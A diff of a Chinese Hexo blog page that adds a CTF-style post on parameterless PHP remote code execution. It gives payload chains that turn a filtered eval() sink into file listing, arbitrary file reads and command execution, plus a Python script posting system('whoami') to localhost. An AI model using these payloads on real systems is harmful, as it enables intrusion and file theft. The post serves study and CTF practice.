@@ -79,12 +79,14 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="标签">
-<meta property="og:url" content="http://yoursite.com/tags/index.html">
+<meta name="description" content="无参数RCE常见形式if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &amp;#123;        eval($_GET[&#39;code&#39;]);&amp;#125;  无参数任意文件读取1.查看当前目录所有文件名print_r(scandir(&#39;.&#39;)); 绝对路径：print_r(realpath(&#39;.&amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="无参数rce">
+<meta property="og:url" content="http://yoursite.com/2021/03/05/%E6%97%A0%E5%8F%82%E6%95%B0rce/index.html">
 <meta property="og:site_name" content="WESAIIIのblog">
-<meta property="article:published_time" content="2020-01-30T12:48:17.000Z">
-<meta property="article:modified_time" content="2021-01-19T14:02:43.997Z">
+<meta property="og:description" content="无参数RCE常见形式if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &amp;#123;        eval($_GET[&#39;code&#39;]);&amp;#125;  无参数任意文件读取1.查看当前目录所有文件名print_r(scandir(&#39;.&#39;)); 绝对路径：print_r(realpath(&#39;.&amp;#">
+<meta property="article:published_time" content="2021-03-05T08:13:26.048Z">
+<meta property="article:modified_time" content="2021-02-18T15:54:48.623Z">
 <meta property="article:author" content="Wesaiii">
 <meta name="twitter:card" content="summary">
 
@@ -116,13 +118,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/tags/"/>
+  <link rel="canonical" href="http://yoursite.com/2021/03/05/无参数rce/"/>
 
 
 
 
 
-  <title>标签 | WESAIIIのblog</title>
+  <title>无参数rce | WESAIIIのblog</title>
   
 
 
@@ -271,40 +273,212 @@
 
   <div id="posts" class="posts-expand">
     
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/03/05/%E6%97%A0%E5%8F%82%E6%95%B0rce/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wesaiii">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WESAIIIのblog">
+    </span>
+
     
-    
-    <div class="post-block page">
       <header class="post-header">
 
-	<h1 class="post-title" itemprop="name headline">标签</h1>
-
-
-
-</header>
-
-      
-      
-      
-      <div class="post-body">
         
         
-          <div class="tag-cloud">
-            <div class="tag-cloud-title">
-                暂无标签
-            </div>
-            <div class="tag-cloud-tags">
+          <h1 class="post-title" itemprop="name headline">无参数rce</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
               
-            </div>
-          </div>
-        
-      </div>
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-03-05T16:13:26+08:00">
+                2021-03-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
       
+
+      
+        <h1 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h1><h3 id="常见形式"><a href="#常见形式" class="headerlink" title="常见形式"></a>常见形式</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="无参数任意文件读取"><a href="#无参数任意文件读取" class="headerlink" title="无参数任意文件读取"></a>无参数任意文件读取</h3><h5 id="1-查看当前目录所有文件名"><a href="#1-查看当前目录所有文件名" class="headerlink" title="1.查看当前目录所有文件名"></a>1.查看当前目录所有文件名</h5><p><code>print_r(scandir(&#39;.&#39;));</code></p>
+<p>绝对路径：<code>print_r(realpath(&#39;.&#39;));</code></p>
+<p>​                   <code>print_r(scandir(getcwd()))</code></p>
+<p>如何构造参数<code>&quot;.&quot;</code>：</p>
+<p>1.<code>localeconv()</code>函数</p>
+<p>返回一包含本地数字及货币格式信息的数组。而数组第一项就是<code>&quot;.&quot;</code>。</p>
+<p>使用方法：<code>print_r(scandir(current(localeconv())));</code></p>
+<p>​                   <code>print_r(scandir(pos(localeconv())));</code>                            </p>
+<p>​                   <code>print_r(scandir(reset(localeconv())));</code></p>
+<p>2.构造<code>chr(46)</code></p>
+<p><code>chr(46)</code>就是字符<code>&quot;.&quot;</code></p>
+<p><code>current(localtime(time()))</code>最多60秒得到46</p>
+<p><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>返回46</p>
+<p><code>ord(hebrevc(crypt(time())))</code>概率返回46</p>
+<p><code>ord(strrev(crypt(serialize(array()))))</code>概率返回46</p>
+<h5 id="2-读取当前目录文件"><a href="#2-读取当前目录文件" class="headerlink" title="2.读取当前目录文件"></a>2.读取当前目录文件</h5><p><code>show_source()</code>、<code>readfile</code>、<code>highlight_file</code>、<code>file_get_contents</code>、<code>readgzfile()</code>函数可读取文件。</p>
+<p>查看文件名的方法输出的是数组，文件名是数组的值，使用如下函数改变指针位置读取文件的数组：</p>
+<p><code>current()/pos()</code>：返回数组中当前单元</p>
+<p><code>each()</code>：返回数组当前的键/值对并将数组指针前移一位</p>
+<p><code>end()</code>：将数组指针指向最后一个单元</p>
+<p><code>next()</code>：将数组指针向前移动一位</p>
+<p><code>prev()</code>：将数组指针倒回一位</p>
+<p>使用<code>array_reverse()</code> 以相反的元素顺序返回数组</p>
+<p>读倒数第二个数组：</p>
+<p><code>show_source(next(array_reverse(scandir(getcwd()))));</code></p>
+<p>使用<code>array_rand(array_flip())</code>，<code>array_flip()</code>交换数组的键和值</p>
+<p><code>show_source(array_rand(array_flip(scandir(current(localeconv())))));</code></p>
+<p>使用<code>array_rand()</code>随机返回一个数组</p>
+<p><code>show_source(array_rand(array_flip(scandir(getcwd()))));</code></p>
+<p>多刷新几次就能读到</p>
+<h5 id="3-查看上一级目录文件名"><a href="#3-查看上一级目录文件名" class="headerlink" title="3.查看上一级目录文件名"></a>3.查看上一级目录文件名</h5><p><code>dirname()</code> ：返回路径中的目录部分。若传入的绝对路径不包含文件名，则返回上一级目录路径；若包含文件名，则返回当前目录路径。</p>
+<p>查看上一级目录所有文件名：</p>
+<p><code>print_r(scandir(dirname(getcwd())));</code></p>
+<p>构造<code>&quot;..&quot;</code>：</p>
+<p><code>scandir(getcwd())</code>出现的数组第二个就是<code>&quot;..&quot;</code>，用<code>next()</code>获取</p>
+<p><code>print_r(scandir(next(scandir(getcwd()))));</code></p>
+<p><code>next(scandir(chr(ord(hebrevc(crypt(time()))))))</code>也可获得<code>&quot;..&quot;</code></p>
+<h5 id="4-读取上级目录文件"><a href="#4-读取上级目录文件" class="headerlink" title="4.读取上级目录文件"></a>4.读取上级目录文件</h5><p><code>chdir()</code> ：改变当前工作目录</p>
+<p>使用<code>dirname()</code>读取上级目录文件：</p>
+<p><code>show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</code></p>
+<p>构造<code>&quot;..&quot;</code>切换路径并读取：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));</span><br><span class="line">或</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));</span><br><span class="line">或</span><br><span class="line">if(chdir(next(scandir(getcwd()))))show_source(array_rand(array_flip(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>
+
+<h5 id="5-查看和读取根目录文件"><a href="#5-查看和读取根目录文件" class="headerlink" title="5.查看和读取根目录文件"></a>5.查看和读取根目录文件</h5><p><code>strrev(crypt(serialize(array())))</code>所获得的字符串第一位有几率是<code>/</code></p>
+<p>有一定权限才能读取到根目录文件：</p>
+<p><code>print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));</code></p>
+<p>或</p>
+<p><code>if(chdir(chr(ord(strrev(crypt(serialize(array())))))))print_r(scandir(getcwd()));</code></p>
+<h3 id="无参数命令执行"><a href="#无参数命令执行" class="headerlink" title="无参数命令执行"></a>无参数命令执行</h3><p>1.<code>getallheaders()</code>和<code>apache_request_headers()</code>函数</p>
+<p>只能在<code>Apache</code>环境下使用：</p>
+<p><code>Payload:?code=eval(pos(getallheaders()))</code></p>
+<p>同时<code>post</code>数据<code>a=phpinfo()</code>或者修改<code>User-Agent</code>为<code>phpinfo()</code></p>
+<p>2.<code>get_defined_vars()</code>函数</p>
+<p>该函数会返回全局变量的值，如get、post、cookie、file数据</p>
+<p>使用<code>get</code>的数据：</p>
+<p><code>Payload:?leon=phpinfo();&amp;code=eval(pos(pos(get_defined_vars())));</code></p>
+<p>使用<code>file</code>的数据：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">"system('whoami');"</span>: <span class="string">""</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#data = &#123;</span></span><br><span class="line"><span class="comment">#"code":"eval(pos(pos(end(get_defined_vars()))));"</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line">r = requests.post(<span class="string">'http://127.0.0.1/333/222/111/index.php?code=eval(pos(pos(end(get_defined_vars()))));'</span>, files=files)</span><br><span class="line">print(r.content.decode(<span class="string">"utf-8"</span>, <span class="string">"ignore"</span>))</span><br></pre></td></tr></table></figure>
+
+<p>3.<code>session_id()</code>函数</p>
+<p> 可以用来获取/设置 当前会话 ID。</p>
+<p>session需要使用<code>session_start()</code>开启，然后返回参数给<code>session_id()</code></p>
+<p>但是有一点限制：文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - 减号）</p>
+<p>但是<code>hex2bin()</code>函数可以将十六进制转换为ASCII 字符，所以我们传入十六进制并使用<code>hex2bin()</code>即可。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval(hex2bin(session_id(session_start())));</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print&#39;phpinfo();&#39;.encode(&#39;hex&#39;)</span><br><span class="line">706870696e666f28293b</span><br><span class="line"></span><br><span class="line">Cookie: PHPSESSID&#x3D;706870696e666f28293b</span><br></pre></td></tr></table></figure>
+
+<p>4.<code>getenv()</code> 函数</p>
+<p>获取环境变量的值(<code>PHP7.1</code>以后)</p>
+<p>方法同1</p>
+
       
     </div>
     
     
     
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/02/01/jwt/" rel="next" title="jwt">
+                <i class="fa fa-chevron-left"></i> jwt
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/03/05/XSS/" rel="prev" title="XSS">
+                XSS <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
   </div>
 
 
@@ -337,8 +511,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -380,6 +563,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#无参数RCE"><span class="nav-number">1.</span> <span class="nav-text">无参数RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#常见形式"><span class="nav-number">1.0.1.</span> <span class="nav-text">常见形式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无参数任意文件读取"><span class="nav-number">1.0.2.</span> <span class="nav-text">无参数任意文件读取</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-查看当前目录所有文件名"><span class="nav-number">1.0.2.0.1.</span> <span class="nav-text">1.查看当前目录所有文件名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-读取当前目录文件"><span class="nav-number">1.0.2.0.2.</span> <span class="nav-text">2.读取当前目录文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-查看上一级目录文件名"><span class="nav-number">1.0.2.0.3.</span> <span class="nav-text">3.查看上一级目录文件名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-读取上级目录文件"><span class="nav-number">1.0.2.0.4.</span> <span class="nav-text">4.读取上级目录文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-查看和读取根目录文件"><span class="nav-number">1.0.2.0.5.</span> <span class="nav-text">5.查看和读取根目录文件</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无参数命令执行"><span class="nav-number">1.0.3.</span> <span class="nav-text">无参数命令执行</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
